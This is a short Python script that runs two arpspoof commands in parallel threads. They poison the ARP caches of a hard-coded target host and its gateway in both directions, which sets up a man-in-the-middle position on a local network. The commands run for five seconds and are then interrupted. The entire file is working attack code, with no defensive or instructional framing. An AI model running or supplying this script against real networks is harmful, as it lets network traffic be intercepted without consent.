import subprocess
import threading
import pexpect
import time

def run_command_in_terminal(command, duration):
    # Function to run the command in a terminal
    def run_command():
        terminal = pexpect.spawn(command)
        time.sleep(duration)
        # Send Ctrl+C
        terminal.sendintr()
        terminal.close()
    
    # Create a thread to run the command
    command_thread = threading.Thread(target=run_command)
    command_thread.start()

if __name__ == "__main__":
    selected_interface = 'eth0'
    target_ip = "192.168.2.9"
    gateway_ip = "192.168.2.254"
    
    # Flag to determine if the program should quit after running the command
    should_quit = True
    
    # Duration to keep the terminal open (in seconds)
    duration = 5 if should_quit else 0
    
    # Command to run in the terminal
    command_1 = f"sudo arpspoof -i {selected_interface} -t {target_ip} {gateway_ip}"
    command_2 = f"sudo arpspoof -i {selected_interface} -t {gateway_ip} {target_ip}"
    
    # Run each command in a terminal using threading
    run_command_in_terminal(command_1, duration)
    run_command_in_terminal(command_2, duration)
